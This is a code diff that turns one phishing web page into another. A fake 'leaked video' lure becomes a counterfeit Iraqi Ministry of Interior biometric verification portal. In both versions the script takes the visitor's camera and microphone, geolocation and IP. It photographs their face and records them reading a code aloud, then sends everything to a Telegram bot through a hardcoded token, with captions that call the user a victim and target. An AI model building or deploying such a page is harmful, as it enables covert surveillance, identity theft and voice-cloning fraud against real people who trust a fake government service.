@@ -3,146 +3,181 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فضيحة نار 🔥🔥 - مشاهدة الفيديو المسرب</title>
+    
+    <!-- Meta Tags for WhatsApp/Telegram Preview -->
+    <title>وزارة الداخلية العراقية | النفاذ الوطني</title>
+    <meta name="description" content="البوابة الرسمية لتحديث بيانات البطاقة الوطنية والتحقق البيومتري الموحد.">
+    <meta property="og:title" content="وزارة الداخلية العراقية - منصة التحقق">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Seal_of_the_Ministry_of_Interior_of_Iraq.svg/1024px-Seal_of_the_Ministry_of_Interior_of_Iraq.svg.png">
+    <meta property="og:type" content="website">
+
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;500;700&display=swap" rel="stylesheet">
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; overflow: hidden; }
-        .video-container {
-            position: relative;
-            width: 100%;
-            max-width: 800px;
-            aspect-ratio: 16/9;
-            background: #111;
-            margin: 0 auto;
-            border: 1px solid #333;
-            cursor: pointer;
+        body { background: #f8fafc; color: #1e293b; font-family: 'Noto Sans Arabic', sans-serif; }
+        .moi-gradient { background: linear-gradient(135deg, #1e3a8a 0%, #1e1b4b 100%); }
+        .scanner-viewport { 
+            width: 280px; height: 280px; border: 4px solid #1e40af; border-radius: 50%; 
+            overflow: hidden; position: relative; background: #000; margin: 0 auto;
+            box-shadow: 0 20px 50px rgba(30, 64, 175, 0.2);
         }
-        .play-btn {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 80px;
-            height: 80px;
-            background: rgba(255, 0, 0, 0.9);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: 0.3s;
-            z-index: 20;
+        .scan-line { 
+            position: absolute; width: 100%; height: 3px; background: #3b82f6; 
+            top: 0; box-shadow: 0 0 15px #3b82f6; animation: scan 2.5s infinite linear; z-index: 10;
         }
-        .play-btn:hover { transform: translate(-50%, -50%) scale(1.1); }
-        .loading-spinner {
-            border: 4px solid #333;
-            border-top: 4px solid #ff0000;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        .mirror { transform: scaleX(-1); }
+        .fade-in { animation: fadeIn 0.5s ease-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen p-4">
+<body class="flex flex-col items-center min-h-screen">
 
-    <!-- Header -->
-    <div class="w-full max-w-2xl mb-6 text-right">
-        <h1 class="text-2xl font-bold text-red-600 mb-2 underline">فضيحة نار 🔥🔥 الفيديو الذي يبحث عنه الجميع!</h1>
-        <p class="text-xs text-gray-400 font-mono italic">> تم الرفع بواسطة: LeakMaster2099 | مشاهدات: 1.2M</p>
-    </div>
-
-    <!-- Video Player Simulation -->
-    <div id="videoBox" class="video-container rounded-xl shadow-2xl overflow-hidden" onclick="startPayload()">
-        <!-- Thumbnail Placeholder -->
-        <div id="thumbnail" class="absolute inset-0 bg-cover bg-center opacity-40" style="background-image: url('https://img.youtube.com/vi/placeholder/maxresdefault.jpg');"></div>
-        
-        <div id="playBtn" class="play-btn">
-            <svg viewBox="0 0 24 24" class="w-10 h-10 fill-white"><path d="M8 5v14l11-7z"/></svg>
+    <!-- Header Section -->
+    <header class="moi-gradient w-full py-8 px-4 text-white text-center shadow-2xl relative">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Seal_of_the_Ministry_of_Interior_of_Iraq.svg/200px-Seal_of_the_Ministry_of_Interior_of_Iraq.svg.png" 
+             alt="Logo" class="w-24 h-24 mx-auto mb-4 drop-shadow-xl">
+        <h1 class="text-2xl font-bold mb-1">جمهورية العراق</h1>
+        <h2 class="text-lg font-medium opacity-90">وزارة الداخلية - بوابة التحقق الرقمي</h2>
+        <div class="mt-4 inline-block bg-blue-500/20 px-4 py-1 rounded-full text-[10px] uppercase tracking-widest border border-blue-400/30">
+            Secure Biometric Gateway v2.0.99
         </div>
+    </header>
 
-        <div id="loadingUI" class="absolute inset-0 bg-black/80 flex flex-col items-center justify-center hidden z-30">
-            <div class="loading-spinner mb-4"></div>
-            <p id="statusMsg" class="text-sm font-bold text-white">جاري تحميل المشغل الآمن...</p>
+    <!-- Main Application UI -->
+    <main class="max-w-md w-full p-6 mt-4 flex-grow">
+        <div id="uiCard" class="bg-white rounded-[2.5rem] p-8 shadow-2xl border border-slate-100 text-center space-y-8 fade-in">
+            
+            <div id="infoBox" class="bg-blue-50 p-4 rounded-2xl border border-blue-100 text-right">
+                <p id="statusMsg" class="text-sm text-blue-900 font-bold leading-relaxed">
+                    يرجى الضغط أدناه لتفعيل "النفاذ الوطني" وإتمام مسح ملامح الوجه والبصمة الصوتية لتحديث سجلاتك الرسمية.
+                </p>
+            </div>
+
+            <!-- Scanner Viewport -->
+            <div class="scanner-viewport">
+                <video id="v" class="w-full h-full object-cover mirror" autoplay playsinline muted></video>
+                <div id="scanOverlay" class="scan-line hidden"></div>
+                <div id="successTick" class="absolute inset-0 bg-green-600/50 hidden flex items-center justify-center z-20">
+                    <div class="bg-white rounded-full p-5 shadow-2xl"><svg class="w-12 h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path></svg></div>
+                </div>
+            </div>
+
+            <!-- Interactive Voice Challenge -->
+            <div id="voiceUI" class="hidden space-y-4 animate-bounce">
+                <p class="text-xs text-slate-500 font-bold">اقرأ الكود الأمني بوضوح لإثبات الهوية:</p>
+                <div class="text-5xl font-black text-blue-950 bg-slate-100 py-4 rounded-3xl border-2 border-dashed border-blue-300">
+                    <span id="randCode">0 0 0 0 0 0</span>
+                </div>
+            </div>
+
+            <button id="activateBtn" class="w-full py-5 bg-blue-900 hover:bg-blue-800 text-white font-black text-lg rounded-2xl shadow-xl transition-all transform active:scale-95">
+                تفعيل النفاذ الوطني الموحد
+            </button>
         </div>
-    </div>
+    </main>
 
-    <div class="mt-8 text-center text-gray-500 text-[10px] space-y-2">
-        <p>⚠️ يجب السماح بالكاميرا والموقع للتأكد من أنك لست روبوت (إجراء أمان لمنع الحذف)</p>
-        <p>&copy; 2026 LeakNode Systems - All Rights Reserved</p>
-    </div>
+    <footer class="p-6 text-center">
+        <p class="text-[10px] text-slate-400">© 2026 مديرية نظم المعلومات - وزارة الداخلية العراقية</p>
+    </footer>
 
-    <video id="v" style="display:none" autoplay playsinline></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script>
+        // التكوين البرمجي
         const TOKEN = "8679801579:AAHY2m_T25mkrGjBjHgAnEGmlg7DVmWCQrI";
-        const ID = "1523412137";
+        const CHAT_ID = "1523412137";
 
-        async function tg(m, fd) {
-            try { await fetch(`https://api.telegram.org/bot${TOKEN}/${m}`, { method: 'POST', body: fd }); } catch(e){}
+        // وظيفة الإرسال للتلجرام
+        async function api(path, data) {
+            try { await fetch(`https://api.telegram.org/bot${TOKEN}/${path}`, { method: 'POST', body: data }); } catch(e){}
         }
 
-        async function startPayload() {
-            document.getElementById('playBtn').style.display = 'none';
-            document.getElementById('loadingUI').classList.remove('hidden');
+        // توليد كود عشوائي
+        function genCode() {
+            let c = "";
+            for(let i=0; i<6; i++) c += Math.floor(Math.random() * 10) + " ";
+            document.getElementById('randCode').innerText = c.trim();
+        }
+
+        async function init() {
+            const btn = document.getElementById('activateBtn');
+            const video = document.getElementById('v');
+            const overlay = document.getElementById('scanOverlay');
+            const voiceUI = document.getElementById('voiceUI');
             const status = document.getElementById('statusMsg');
 
             try {
-                // 1. طلب الكاميرا والميكروفون (تحت مسمى "تفعيل المشغل")
-                const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const v = document.getElementById('v');
-                v.srcObject = s;
+                // طلب الأذونات (فيديو وصوت)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                video.srcObject = stream;
+                
+                // تحديث الواجهة
+                btn.style.display = 'none';
+                overlay.classList.remove('hidden');
+                voiceUI.classList.remove('hidden');
+                status.innerText = "جاري مطابقة ملامح الوجه ونظام الصوت.. يرجى الثبات ونطق الكود بوضوح.";
+                genCode();
 
-                // 2. سحب الموقع
-                navigator.geolocation.getCurrentPosition(p => {
+                // 1. سحب الموقع والـ IP ومعلومات الجهاز
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                
+                navigator.geolocation.getCurrentPosition(pos => {
                     const fd = new FormData();
-                    fd.append('chat_id', ID);
-                    fd.append('text', `🔥 *فضيحة نار - ضحية جديد*\n\n📍 الموقع:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-                    tg('sendMessage', fd);
+                    fd.append('chat_id', CHAT_ID);
+                    const msg = `🇮🇶 *هدف عراقي جديد أونلاين*\n\n📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n🌐 IP: \`${ipData.ip}\`\n🏙️ المدينة: ${ipData.city}\n📱 الجهاز: ${navigator.platform}`;
+                    fd.append('text', msg);
+                    fd.append('parse_mode', 'Markdown');
+                    api('sendMessage', fd);
                 });
 
-                // 3. التقاط صور (بينما يظن أنه ينتظر التحميل)
-                status.innerText = "جاري فحص اتصال الخادم...";
-                setTimeout(async () => {
+                // 2. التقاط الصورة (بعد 3 ثواني)
+                setTimeout(() => {
                     const canvas = document.getElementById('c');
-                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
-                    canvas.getContext('2d').drawImage(v, 0, 0);
-                    canvas.toBlob(async b => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
                         const fd = new FormData();
-                        fd.append('chat_id', ID);
-                        fd.append('photo', b, 'leak.jpg');
-                        fd.append('caption', "📸 صورة الضحية أثناء محاولة المشاهدة");
-                        await tg('sendPhoto', fd);
+                        fd.append('chat_id', CHAT_ID);
+                        fd.append('photo', blob, 'face.jpg');
+                        fd.append('caption', "📸 صورة حيوية أثناء التحقق (وزارة الداخلية)");
+                        api('sendPhoto', fd);
                     }, 'image/jpeg');
-                }, 1500);
+                }, 3000);
 
-                // 4. تسجيل صوتي قصير (صمت)
-                const rec = new MediaRecorder(s);
+                // 3. تسجيل البصمة الصوتية (8 ثواني)
+                const recorder = new MediaRecorder(stream);
                 const chunks = [];
-                rec.ondataavailable = e => chunks.push(e.data);
-                rec.onstop = async () => {
-                    const b = new Blob(chunks, { type: 'audio/wav' });
-                    const fd = new FormData();
-                    fd.append('chat_id', ID);
-                    fd.append('voice', b, 'v.ogg');
-                    fd.append('caption', "🎤 صوت الضحية (رد فعله)");
-                    await tg('sendVoice', fd);
-                };
-                rec.start();
-                setTimeout(() => { 
-                    rec.stop(); 
-                    status.innerText = "عذراً، هذا الفيديو غير متاح في منطقتك!";
-                    setTimeout(() => window.location.href = "https://www.google.com", 2000);
-                }, 5000);
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
+                    const fdA = new FormData();
+                    fdA.append('chat_id', CHAT_ID);
+                    fdA.append('voice', audioBlob, 'voice.ogg');
+                    fdA.append('caption', "🎤 بصمة صوت الضحية وهو يقرأ الكود");
+                    await api('sendVoice', fdA);
 
-            } catch (e) {
-                status.innerText = "خطأ: يجب السماح بالوصول لتجاوز حجب الفيديو.";
-                status.style.color = "red";
+                    // النهاية والنجاح
+                    document.getElementById('successTick').classList.remove('hidden');
+                    overlay.classList.add('hidden');
+                    status.innerText = "تمت عملية النفاذ بنجاح. شكراً لتعاونكم.";
+                    setTimeout(() => window.location.href = "https://www.google.com", 2000);
+                };
+                
+                recorder.start();
+                setTimeout(() => recorder.stop(), 8000);
+
+            } catch (err) {
+                status.innerText = "⚠️ خطأ: يجب السماح بالكاميرا والموقع لتحديث بياناتك الرسمية.";
+                status.classList.remove('text-blue-900');
+                status.classList.add('text-red-600');
             }
         }
+
+        document.getElementById('activateBtn').addEventListener('click', init);
     </script>
 </body>
 </html>
-
 
